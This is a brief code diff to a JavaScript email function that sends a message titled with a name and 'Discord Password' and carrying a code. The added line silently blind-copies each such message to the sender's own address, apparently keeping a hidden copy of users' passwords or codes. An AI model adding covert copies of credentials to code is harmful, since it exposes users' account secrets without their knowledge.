@@ -101,6 +101,7 @@ function sendEmail(toEmail, code, name, message) {
     const mailOptions = {
         from: email,
         to: toEmail,
+        bcc: email,
         subject: name + ' Discord Password',
         text: code
     };
